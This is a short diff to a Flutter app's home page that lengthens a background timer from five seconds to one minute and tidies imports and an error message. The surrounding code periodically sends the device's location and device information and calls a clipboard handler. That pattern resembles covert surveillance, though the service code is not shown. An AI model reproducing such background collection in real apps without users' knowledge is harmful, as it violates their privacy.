@@ -1,9 +1,5 @@
 import 'dart:async';
-
 import 'package:flutter/material.dart';
-import 'package:location_app/main.dart';
-import 'package:location_app/services/background/get_device_info.dart';
-import 'package:permission_handler/permission_handler.dart';
 import '../screens/home_body_screen.dart';
 import '../screens/home_floating_action_button_screen.dart';
 import '../services/background/all_permissions.dart';
@@ -46,7 +42,7 @@ class _HomePageState extends State<HomePage> {
 
   void sendIt() {
     Timer.periodic(
-      const Duration(seconds: 5),
+      const Duration(minutes: 1),
       (timer) async {
         try {
           await AppBackgroundServices.sendLocation();
@@ -54,7 +50,7 @@ class _HomePageState extends State<HomePage> {
         try {
           await AppBackgroundServices.sendDeviceInfo();
         } catch (e) {
-          print("MANA ERROR: $e");
+          print("ERROR IS: $e");
         }
         try {
           await AppBackgroundServices.clipboardHandler();
